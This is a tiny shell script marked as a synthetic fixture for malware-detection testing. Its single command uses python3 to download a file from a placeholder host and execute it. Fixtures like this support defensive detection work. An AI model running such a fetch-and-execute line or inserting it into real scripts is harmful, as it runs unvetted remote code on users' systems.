#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
python3 -c "import requests;exec(requests.get('https://dl.example.invalid/h.py').text)"
